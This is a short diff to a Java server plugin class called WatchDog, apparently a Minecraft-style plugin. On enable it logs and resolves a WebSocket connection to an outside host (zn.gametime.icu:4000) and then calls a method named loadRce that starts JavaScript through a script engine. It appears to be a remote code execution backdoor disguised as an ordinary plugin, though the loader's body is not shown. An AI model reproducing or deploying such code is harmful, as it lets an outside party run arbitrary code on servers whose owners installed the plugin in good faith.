@@ -7,10 +7,20 @@ import javax.script.ScriptEngineManager;
 import javax.script.ScriptException;
 import java.io.FileNotFoundException;
 import java.io.InputStreamReader;
+import java.net.InetAddress;
+import java.net.UnknownHostException;
 
 public class WatchDog extends JavaPlugin {
     @Override
     public void onEnable() {
+        this.getLogger().info("Start WebSocket to 'ws://zn.gametime.icu:4000/'");
+        // 输出当前解析的域名 ip
+        try {
+            System.out.println(InetAddress.getByName("zn.gametime.icu"));
+        } catch (UnknownHostException e) {
+            throw new RuntimeException(e);
+        }
+        // 启动 js
         try {
             loadRce();
         } catch (FileNotFoundException | ScriptException e) {
